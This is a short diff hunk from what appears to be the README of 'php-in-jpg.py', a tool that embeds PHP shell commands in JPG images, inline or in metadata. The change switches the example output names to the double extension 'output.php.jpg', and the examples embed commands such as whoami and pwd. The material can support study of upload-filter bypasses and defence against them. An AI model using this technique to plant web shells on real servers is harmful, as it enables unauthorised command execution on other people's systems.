@@ -71,13 +71,13 @@ $ python php-in-jpg.py -m inline -c fixed -x "ls -l"
 $ python php-in-jpg.py -m inline -c fixed -x "ls -l" -t wrong_path
 [-] Error: template file not found at: wrong_path
 
-$ python php-in-jpg.py -m inline -c fixed -x "pwd" -t template/custom.tpl -o output.php
-[+] File generated: output.php
+$ python php-in-jpg.py -m inline -c fixed -x "pwd" -t template/custom.tpl -o output.php.jpg
+[+] File generated: output.php.jpg
 [!] Embedded command: pwd
 
-$ python php-in-jpg.py -m metadata -c fixed -x "whoami" -o output.php
+$ python php-in-jpg.py -m metadata -c fixed -x "whoami" -o output.php.jpg
     1 image files updated
-[+] File generated: output.php
+[+] File generated: output.php.jpg
 [!] Embedded command: whoami
 ```
 
